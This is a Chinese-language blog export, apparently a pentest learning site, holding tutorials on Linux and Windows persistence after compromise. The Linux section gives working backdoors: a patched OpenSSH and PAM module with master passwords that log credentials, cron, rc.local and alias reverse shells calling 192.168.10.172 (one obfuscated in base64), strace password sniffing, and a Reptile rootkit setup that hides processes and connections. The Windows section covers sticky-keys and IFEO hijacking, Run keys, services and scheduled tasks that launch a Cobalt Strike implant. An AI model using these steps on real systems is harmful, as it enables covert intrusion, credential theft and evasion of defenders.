class="headerlink" title="SUID shell"></a>SUID shell</h3><p><code>cp /bin/bash /tmp/shell</code>#将交互式shell移动到tmp目录</p><p><code>chmod +s /tmp/shell</code>#赋权</p><p><code>exit</code>#退出当前用户</p><p><code>/tmp/shell -p</code>#普通用户执行</p><p><code>whoami</code>#查看权限</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5c51a6f.png" alt="image-20240909195142711"></p><p>这样相当于我们在目标主机下留下了一个后门</p><h3 id="Openssh后门"><a href="#Openssh后门" class="headerlink" title="Openssh后门"></a>Openssh后门</h3><p><a href="https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw">相关文章</a></p><p>我们把目标主机内置的ssh软件重新安装并自定义 在自定义的过程中给他一个万能密码</p><p><code>ssh -V</code>  查看版本号</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5b5f1dc.png" alt="image-20240909195637552"></p><p>安装依赖</p><p><code>yum -y install openssl openssl-devel pam-devel zlib zlib-devel  </code></p><p><code>yum -y install gcc gcc-c++ make  </code>   </p><p>wget下载安装包</p><p><code>wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</code></p><p><code>wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz</code></p><p>tar -xzvf 解压然后拷贝</p><p><code>cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1</code></p><p><code>cd openssh-5.9p1 &amp;&amp; patch &lt; sshbd5.9p1.diff</code></p><p>改版本</p><p><code>vi version.h</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5b7c447.png" alt="image-20240909200756423"></p><p>把这个版本改了</p><p>改成之前查到的版本信息 防止受害者发现openssh被换</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5d3ed63.png" alt="image-20240909200849163"></p><p>改密码</p><p><code>vi includes.h</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5d0312c.png" alt="image-20240909201046800"></p><p>改这些</p><blockquote><p>#define ILOG “&#x2F;tmp&#x2F;ilog”   记录了谁登录了我<br>#define OLOG “&#x2F;tmp&#x2F;olog”记录了我登录了谁<br>#define SECRETPW “apaajaboleh”万能密码</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092e5c94e2d.png" alt="image-20240909201149944"></p><p>我们把这个万能密码改了</p><p>安装编译</p><p><code>./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 &amp;&amp; make &amp;&amp; make install</code></p><p>编译完了就已经替换成功了</p><p>重启ssh</p><p><code>service sshd restart</code></p><p>重启ssh服务报错解决方案</p><ul><li><p>方法1：接着做如下操作<br>chmod 600 &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</p><p>chmod 600 &#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key</p><p>service sshd start</p></li><li><p>方法2：或者尝试操作如下</p><p>chown -R root.root &#x2F;var&#x2F;empty&#x2F;sshd</p><p>chmod 744 &#x2F;var&#x2F;empty&#x2F;sshd</p><p>service sshd restart</p></li></ul><p><strong>安装成功后 我们上传的gz文件和解压后的文件删去后不影响</strong></p><p><code>netstat -antp</code> 可以看到连接的情况</p><h3 id="SSH-PAM后门"><a href="#SSH-PAM后门" class="headerlink" title="SSH-PAM后门"></a>SSH-PAM后门</h3><p>刚刚我们换的是ssh版本 现在我们来换PAM</p><p>PAM是一个认证模块 用来登录验证等</p><p><code>rpm -qa | grep pam</code>查询版本 </p><p><code>wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz</code>下载(受害者版本是什么我们就下什么)</p><p><code>tar -zxvf Linux-PAM-1.1.8</code>解压</p><p><code>yum install gcc flex flex-devel -y</code>安装编译环境</p><p>找到报错密码的文件</p><p><code>cd Linux-PAM-1.1.8-master/modules/pam_unix/vi pam_unix_auth.c</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e7156c22.png" alt="image-20240909205902394"></p><p>找到关键信息</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5c0e6cc.png" alt="image-20240909210030311"></p><p>换成这样</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6747c33.png" alt="image-20240909210146600"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* verify the password of this user */</span></span><br><span class="line">retval = _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;hackers&quot;</span>,p)==<span class="number">0</span>)&#123;<span class="keyword">return</span> PAM_SUCCESS;&#125;    <span class="comment">//后门密码</span></span><br><span class="line"><span class="keyword">if</span>(retval == PAM_SUCCESS)&#123;    </span><br><span class="line">          FILE * fp;    </span><br><span class="line">          fp = fopen(<span class="string">&quot;/tmp/.sshlog&quot;</span>, <span class="string">&quot;a&quot;</span>);<span class="comment">//SSH登录用户密码保存位置</span></span><br><span class="line">          <span class="built_in">fprintf</span>(fp, <span class="string">&quot;%s : %s\n&quot;</span>, name, p);    </span><br><span class="line">          fclose(fp);&#125; </span><br><span class="line">   name = p = <span class="literal">NULL</span>;</span><br><span class="line">   AUTH_RETURN;</span><br></pre></td></tr></table></figure><p>密码就是你的密码 这个密码就是hackers</p><p>最好在本地换 不然编译可能会出问题</p><p>先rm 把他本地的pam_unix_auth.c文件删了再上传</p><p>到安装目录下编译安装</p><p><code>./configure &amp;&amp; make</code></p><p>备份替换</p><p>备份原有pam_unix.so,防止出现错误登录不上</p><p>复制新PAM模块到&#x2F;lib64&#x2F;security&#x2F;目录下 </p><p><code>cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bakcp</code></p><p><code>cd Linux-PAM-1.1.8/modules/pam_unix/.libs</code></p><p><code>cp pam_unix.so /usr/lib64/security/pam_unix.so</code></p><p>然后我们就可以用PAM的密码进行SSH登录</p><h3 id="ssh公私钥免密登录"><a href="#ssh公私钥免密登录" class="headerlink" title="ssh公私钥免密登录"></a>ssh公私钥免密登录</h3><p>ssh登录都要改ssh配置才行</p><p><code>vim /etc/ssh/sshd_config</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e5cb6d3d.png" alt="image-20240909212043323"></p><p>把ssh生成的公钥放到目标服务器上 下次登录时会进行公私钥的匹配 匹配成功就不需要输密码</p><p>因为时攻击者kali连接Linux  </p><p>kali是客户端</p><p>kali生成公钥</p><p><code>ssh-keygen -t rsa</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e69aa36f.png" alt="image-20240909212332683"></p><p>到这个&#x2F;root&#x2F;.ssh&#x2F;id_rsa下去找(红日打过)</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5b58c57.png" alt="image-20240909212445836"></p><p>将内容放到受害者主机的相同路径</p><p><code>/root/.ssh/authorized_keys</code></p><p>没有.ssh文件夹的话就本地登录一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5f78a2d.png" alt="image-20240909212755672"></p><p>创建authorized_keys文件</p><p>kali直接可以ssh免密登录</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5d80672.png" alt="image-20240909212902504"></p><h3 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h3><p>通俗的理解：类似Windows的快捷方式</p><p>先看看开没开PAM</p><p><code>cat /etc/ssh/sshd_config|grep UsePAM</code></p><p>创建后门</p><p><code>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</code></p><p>kali ssh登录 端口就是8888 </p><p>但是</p><ul><li><p>仍需要密码</p></li><li><p>重启服务器就会失效</p></li><li><p>端口占用情况</p></li><li><p>容易被外联发现</p></li></ul><h3 id="SSH-wrapper"><a href="#SSH-wrapper" class="headerlink" title="SSH  wrapper"></a>SSH  wrapper</h3><p>原理：</p><blockquote><p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell<br>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p></blockquote><p><code>cd /usr/sbin/</code>         到存放系统管理工具的地方</p><p><code>mv sshd ../bin/</code>       将sshd文件移动到&#x2F;usr&#x2F;bin&#x2F;目录</p><p><code>echo &#39;#!/usr/bin/perl&#39; &gt;sshd</code>   创建一个新的sshd文件，并将其设置为Perl脚本</p><p><code>echo &#39;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#39; &gt;&gt;sshd</code>    向sshd文件中添加一行代码，当接收到以4A开头的以太网帧时，执行&#x2F;bin&#x2F;sh</p><p><code>echo &#39;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</code>    向sshd文件中添加一行代码，以便在其他情况下正常执行原始的&#x2F;usr&#x2F;bin&#x2F;sshd程序。</p><p><code>chmod u+x sshd</code>   给sshd赋权</p><p><code>service sshd restart</code>   重启SSH服务</p><p>kali登录</p><p><code>socat STDIO TCP4:192.168.10.195:22,sourceport=13377</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e66c726f.png" alt="image-20240909214616175"></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>计划任务反弹shell</p><p>1.sh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.10.172/5555  0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>赋权</p><p><code>chmod +sx 1.sh</code></p><p>添加计划任务</p><p><code>vi /etc/cromtab</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e66a456a.png" alt="image-20240909215119359"></p><p>监听上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092e673f8d6.png" alt="image-20240909215441416"></p><h3 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h3><p>调用启动项路径</p><p>启动项路径</p><p><code>vi /etc/rc.d/rc.local</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e67850e2.png" alt="image-20240909215925179"></p><p>把反弹shell的文件路径放进去</p><p>赋权</p><p><code>chmod +x /etc/rc.d/rc.local</code></p><p>重启上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092e608da02.png" alt="image-20240909220317890"></p><h3 id="strace后门"><a href="#strace后门" class="headerlink" title="strace后门"></a>strace后门</h3><p>strace是一个动态跟踪工具 它可以跟踪系统的调用执行 类似于键盘记录的功能</p><p>我们通过这个后门来记录ssh登录时的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br><span class="line">跟踪 sshd 进程的系统调用，特别是 read 和 write 系统调用，并将输出重定向到一个日志文件中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grep -E &#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27; /tmp/.sshd.log</span><br><span class="line">使用 grep 来搜索 /tmp/.sshd.log 文件中的特定模式</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/67092e5dc023f.png" alt="image-20240910173617173"></p><p>finalshell重新连接一下centos</p><p><img src="https://bu.dusays.com/2024/10/11/67092e71841a1.png" alt="image-20240910173717309"></p><p>再输入<code>grep -E &#39;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#39; /tmp/.sshd.log</code></p><p>有记录了</p><p>找到账号密码</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6576c4c.png" alt="image-20240910173820534"></p><h3 id="Alias后门"><a href="#Alias后门" class="headerlink" title="Alias后门"></a>Alias后门</h3><p>Alias：为命令设置一个别名</p><p><code>alias ls=‘ls -al’</code>     将ls命名成ls -al</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6a32a5d.png" alt="image-20240910174256578"></p><p>这样我们就可以把别名改成运行木马或者反弹shell</p><p><code>unalias ls</code>  删除ls的别名</p><p>​</p><p><code>alias ls=&#39;alerts()&#123; ls $* --color=auto;bash -i &gt;&amp; /dev/tcp/192.168.10.172/3333 0&gt;&amp;1; &#125;;alerts&#39;</code></p><p>将ls的别名改成反弹shell</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6016351.png" alt="image-20240910174635278"></p><p>ls能正常运行</p><p>kali监听</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6051c2d.png" alt="image-20240910174713352"></p><p><strong>但是centos命令卡死</strong></p><p>解决</p><p>python反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias ls=&#x27;alerts()&#123; ls $* --color=auto;python3 -c &quot;import base64,sys;exec(base64.b64decode(&#123;2:str,3:lambda b:bytes(b,&#x27;\&#x27;&#x27;UTF-8&#x27;\&#x27;&#x27;)&#125;[sys.version_info[0]](&#x27;\&#x27;&#x27;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTkyLjE2OC4xMC4xNzIiLCAzMzMzKSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDApCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAxKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMikKICAgICAgICBwID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGV4aXQoKQ==&#x27;\&#x27;&#x27;)))&quot;;&#125;;alerts&#x27;</span><br></pre></td></tr></table></figure><p>但是要base64编码</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6554024.png" alt="image-20240910175257863"></p><p>目标要用python环境</p><p><img src="https://bu.dusays.com/2024/10/11/67092e71365c4.png" alt="image-20240910175452435"></p><p>正常执行且可以执行命令</p><p>kali也监听成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5fbff1f.png" alt="image-20240910175652239"></p><h3 id="内核加载LKM-rootkit后门"><a href="#内核加载LKM-rootkit后门" class="headerlink" title="内核加载LKM-rootkit后门"></a>内核加载LKM-rootkit后门</h3><p>相较于其他的维权方式 会有外联有进程等</p><p>但rootkit可以隐藏外联和进程</p><p><a href="https://github.com/f0rb1dd3n/Reptile/releases/">项目地址</a></p><p><a href="https://github.com/f0rb1dd3n/Reptile/wiki">使用参考</a></p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>先把项目zip放到目标主机 </p><p>1.sh</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$kernel</span>=`<span class="built_in">uname</span> -r`</span><br><span class="line"><span class="comment"># centos</span></span><br><span class="line">yum -y install perl vim gcc make g++ unzip</span><br><span class="line"><span class="comment"># 由于Cenots内核管理不便，所以使用下载对应版本的kernel-devel到本地</span></span><br><span class="line">yum -y localinstall kernel-devel-<span class="string">&quot;<span class="variable">$kernal</span>&quot;</span>.rpm</span><br><span class="line"><span class="built_in">cd</span> Reptile-2.0/ &amp;&amp; <span class="built_in">chmod</span> +x ./setup.sh</span><br><span class="line">./setup.sh install &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">reptile</span></span><br><span class="line"><span class="string">hax0r#TOKEN</span></span><br><span class="line"><span class="string">s3cr3t</span></span><br><span class="line"><span class="string">reptile</span></span><br><span class="line"><span class="string">666</span></span><br><span class="line"><span class="string">y</span></span><br><span class="line"><span class="string">192.168.10.172#ip</span></span><br><span class="line"><span class="string">4444#端口</span></span><br><span class="line"><span class="string">1#连接延迟</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><p>给1.sh赋权</p><p>执行</p><p><code>./1.sh</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e66d8ede.png" alt="image-20240910180900059"></p><p>环境配置成功</p><h4 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h4><p>众所周知</p><p><code>ps</code>可以看到进程</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5df240e.png" alt="image-20240910181059023"></p><p>我们用这个来隐藏进程</p><p><code>/reptile/reptile_cmd hide 33363</code>&#x2F;&#x2F;33363为进程id号</p><p>把hide改成show就回复显示了</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6eec56a.png" alt="image-20240910181430676"></p><h4 id="连接隐藏"><a href="#连接隐藏" class="headerlink" title="连接隐藏"></a>连接隐藏</h4><p><code>netstat -antp</code></p><p>可以看到外联情况</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6d87acd.png" alt="image-20240910181635268"></p><p>我们隐藏一下反弹shell的连接</p><p><code>/reptile/reptile_cmd tcp 192.168.10.172 8899 hide</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e65c4540.png" alt="image-20240910182145870"></p><p>这里的tcp就是查出来的第一个数据</p><p>还可能时tcp6等 根据实际情况改</p><p>同样把hide改成show就回复了</p><h4 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h4><p><code>mkdir reptile_文件名</code></p><p>这样创建的隐藏文件是不会被ls -al查出来的</p><p><img src="https://bu.dusays.com/2024/10/11/67092e71db55e.png" alt="image-20240910182540000"></p><p>看不到 但是可以进去</p><h4 id="客户端通信"><a href="#客户端通信" class="headerlink" title="客户端通信"></a>客户端通信</h4><p>前面的利用都是在目标主机上进行的</p><p>我们也可以在我们本地搭建客户端进行连接</p><p>kali安装</p><p><code>apt install libreadline-dev</code></p><p><code>cd Reptile-2.0</code></p><p><code>./setup.sh client</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092e6747c64.png" alt="image-20240910183115979"></p><p>可以看到客户端装在了这个文件夹下的bin下</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6464195.png" alt="image-20240910183214272"></p><p><code>./client</code></p><p>进入客户端</p><p><img src="https://bu.dusays.com/2024/10/11/67092e5e5b974.png" alt="image-20240910183252657"></p><p><img src="https://bu.dusays.com/2024/10/11/67092e658e724.png" alt="image-20240910183329815"></p><p>配置一下</p><p><img src="https://bu.dusays.com/2024/10/11/67092e66d667c.png" alt="image-20240910183401233"></p><p>和msf很像</p><p>这里的rport是伪装端口</p><p>我们要用受害者主机中已开放的端口</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6a78b88.png" alt="image-20240910183904299"></p><p>照着那个1.sh的配</p><p>run</p><p><img src="https://bu.dusays.com/2024/10/11/67092e6b472e4.png" alt="image-20240910183935510"></p><p>成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092e638364e.png" alt="image-20240910184030034"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 维权 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows权限维持</title>
      <link href="/2024/10/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2024/10/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="window权限维持"><a href="#window权限维持" class="headerlink" title="window权限维持"></a>window权限维持</h2><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><p>当我们拿到权限以后 不可避免的会遇到目标主机可能会关机 重启 应急排查等 让我们的权限失效 这时候我们就需要进行权限维持 长久的对目标进行控制</p><h3 id="辅助功能进行劫持"><a href="#辅助功能进行劫持" class="headerlink" title="辅助功能进行劫持"></a>辅助功能进行劫持</h3><p>辅助功能提供了其他选项（屏幕键盘、放大镜、屏幕阅读），可以帮助人更轻松地使用Windows操作系统，但是此功能可能会被滥用</p><blockquote><ul><li>屏幕键盘:  c:\windows\system32\osk.exe</li><li>放大镜: c:\windows\system32\Mageify.exe</li><li>粘滞键: c:\windows\system32\sethc.exe</li><li>旁白：C:\Windows\System32\Narrator.exe</li><li>显示切换器 C:\Windows\System32\DisplaySwitch.exe</li><li>应用切换器：C:\Windows\System32\AtBroker.exe</li></ul></blockquote><p>这些辅助功能说到底还是exe可执行程序</p><p>如果我们将这个可执行程序修改成我们的木马或者cmd呢</p><p><img src="https://bu.dusays.com/2024/10/11/67092daf3f416.png" alt="image-20240901163311021"></p><p>5下shift可以触发粘滞键</p><p>这意味着我们可以在未登录的情况下执行我们想执行的命令(shift后门 ) </p><p>如果我们直接重命名辅助功能程序名</p><p><img src="https://bu.dusays.com/2024/10/11/67092db349e92.png" alt="image-20240901163646999"></p><p>不行的</p><p>权限不够 </p><p>如果是2008及以前的系统 我们是可以直接给他把权限改了的</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbb7df2d.png" alt="image-20240901164531511"></p><p>可以将sethc.exe拥有者改为administrator</p><p>然后就可以执行</p><p><code>move C:\windows\system32\sethc.exe C:\windows\system32\sethc1.exe</code><br><code>Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe</code></p><p>把cmd改过来</p><p>2012及以后的就不能修改了</p><h3 id="映像劫持-重定向劫持"><a href="#映像劫持-重定向劫持" class="headerlink" title="映像劫持(重定向劫持)"></a>映像劫持(重定向劫持)</h3><p>IFEO: image File Execution options </p><p>当我们双击运行程序时 系统会查询IFEO注册表 如果发现存在完全相同的子键 就会查询对应子键中包含的”debugger”键值名 如果这个键值名不为空 系统就会把debugger参数指定的程序文件来作为启动的程序</p><p>出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化 就会执行</p><p>cmd-&gt;regedit：打开注册表</p><p>在里面找到IFEO注册表</p><blockquote><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092db54e42c.png" alt="image-20240901165954376"></p><p>这里有一个iexplore.exe</p><p>这是IE浏览器</p><p>这里没有debugger键 我们直接新建一个</p><p><img src="https://bu.dusays.com/2024/10/11/67092daf63de9.png" alt="image-20240901170553797"></p><p>先给他换成cmd吧</p><p><img src="https://bu.dusays.com/2024/10/11/67092dafe9f60.png" alt="image-20240901170702549"></p><p>一旦点击IE浏览器 就会启动cmd</p><p><img src="https://bu.dusays.com/2024/10/11/67092dafee941.png" alt="image-20240901170821160"></p><p>成功</p><p>既然能执行从cmd 就能执行我们的木马</p><p>这里我直接用CS生成木马并开监听</p><p><img src="https://bu.dusays.com/2024/10/11/67092db08253f.png" alt="image-20240901171111932"></p><p>传上去</p><p>改debugger</p><p><img src="https://bu.dusays.com/2024/10/11/67092db02decb.png" alt="image-20240901171145508"></p><p><img src="https://bu.dusays.com/2024/10/11/67092db2488af.png" alt="image-20240901171211991"></p><p>上线</p><p>但是这样我们是相当于开3389打的</p><p>那么我们该怎么远程直接修改目标注册表呢</p><p>可以用这个命令</p><p><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:\404.exe&quot;</code></p><p>CS执行命令</p><p><img src="https://bu.dusays.com/2024/10/11/67092dba61b04.png" alt="image-20240901171841518"></p><p>已经加进来了</p><p><img src="https://bu.dusays.com/2024/10/11/67092db0204c8.png" alt="image-20240901171913035"></p><p>执行IE 有新会话上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092db540bee.png" alt="image-20240901172018018"></p><p>既然我们能劫持IE 我们就可以劫持其他程序 只要我们知道它在哪里 叫什么名字</p><p>这里我们劫持一下记事本</p><p><img src="https://bu.dusays.com/2024/10/11/67092db219599.png" alt="image-20240901172424268"></p><p>但是有个问题就是IEFO里没有notepad项</p><p>我们直接给他生成一个</p><p><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe /c calc&quot;</code></p><p>这里劫持成计算器</p><p><img src="https://bu.dusays.com/2024/10/11/67092db5d80b6.png" alt="image-20240901172928721"></p><p>win+r notepad</p><p><img src="https://bu.dusays.com/2024/10/11/67092db38feba.png" alt="image-20240901172959330"></p><p>直接调用计算器</p><p>IFEO中已经多了notepad项</p><p><img src="https://bu.dusays.com/2024/10/11/67092db86bc7a.png" alt="image-20240901173054330"></p><p>同样也可以改成木马</p><p><img src="https://bu.dusays.com/2024/10/11/67092db86858e.png" alt="image-20240901173212334"></p><p>上线</p><p>但是 这同样有个问题就是 我们劫持的程序本身不能正常运行 这会引起受害者的怀疑 </p><p>但是我们可以用这个命令：</p><p><code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512</code></p><p><code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1</code></p><p>&#x2F;&#x2F;替换shell.exe路径为木马路径<br><code>reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /d &quot;C:\404.exe&quot;</code></p><p>配合globalflag 既能正常打开程序又能执行木马</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbaa1a2c.png" alt="image-20240901174040172"></p><p>记事本一关 上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092db9774e4.png" alt="image-20240901174129912"></p><p>同样 受害者后台会有很多木马</p><p><img src="https://bu.dusays.com/2024/10/11/67092db087ffc.png" alt="image-20240901174328418"></p><h3 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h3><h4 id="文件启动项"><a href="#文件启动项" class="headerlink" title="文件启动项"></a>文件启动项</h4><p><img src="https://bu.dusays.com/2024/10/11/67092db08c773.png" alt="image-20240901175018258"></p><p>文件夹有启动项</p><p>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</p><p>在这里面上传木马 会当作启动项执行</p><p><img src="https://bu.dusays.com/2024/10/11/67092db0e1a1c.png" alt="image-20240901175336469"></p><p>有了</p><p><img src="https://bu.dusays.com/2024/10/11/67092db01cf9f.png" alt="image-20240901175403435"></p><p>重启</p><p><img src="https://bu.dusays.com/2024/10/11/67092db12d898.png" alt="image-20240901175458202"></p><p>上线</p><h4 id="注册表启动项"><a href="#注册表启动项" class="headerlink" title="注册表启动项"></a>注册表启动项</h4><p>注册表也可以</p><p><img src="https://bu.dusays.com/2024/10/11/67092db8ad52a.png" alt="image-20240901175712655"></p><p>多种路径有启动项</p><p><img src="https://bu.dusays.com/2024/10/11/67092dbb3ce9c.png" alt="image-20240901175836967"></p><p>命令也是差不多的</p><p><code>reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v &quot;cmd&quot; /t REG_SZ /d &quot;c:\404.exe&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092db9c11d3.png" alt="image-20240901180120081"></p><p>重启</p><p><img src="https://bu.dusays.com/2024/10/11/67092db66bded.png" alt="image-20240901180220990"></p><p>上线</p><h4 id="服务启动项"><a href="#服务启动项" class="headerlink" title="服务启动项"></a>服务启动项</h4><p>服务是系统权限 我们可以新建一个服务来开启动项</p><p><code>sc create pentestlab binpath= &quot;cmd.exe /k C:\404.exe&quot; start=&quot;auto&quot; obj=&quot;LocalSystem&quot;</code></p><p><code>sc start pentestlab</code></p><p>删除服务</p><p><code>sc delete &quot;pentestlab&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092dbd9ec7a.png" alt="image-20240901181323824"></p><p><img src="https://bu.dusays.com/2024/10/11/67092dba23ccb.png" alt="image-20240901181348388"></p><p>没问题</p><p>CS也监听到了</p><p><img src="https://bu.dusays.com/2024/10/11/67092db549989.png" alt="image-20240901181427107"></p><p>重启也没问题</p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>有两种写法</p><ul><li><p>at：xp、2003</p></li><li><p>schtasks：win7及2008</p></li></ul><blockquote><p>schtasks &#x2F;Create &#x2F;tn Updater &#x2F;tr notepad.exe &#x2F;sc MINUTE &#x2F;mo 1</p><p>&#x2F;tn 任务名字</p><p>&#x2F;tr 启动运行的脚本</p><p>&#x2F;sc 多久运行一次</p><p>&#x2F;Create 创建新计划任务</p><p>&#x2F;Delete 删除计划任务</p><p>&#x2F;Query 显示计划热为奴</p><p>&#x2F;Change 更改计划任务属性</p><p>&#x2F;Run 按需运行计划任务</p><p>&#x2F;End 中止当前正在运行的计划任务</p><p>&#x2F;ShowSid 显示与计划的任务名称相应的安全标识符</p><p>&#x2F;? 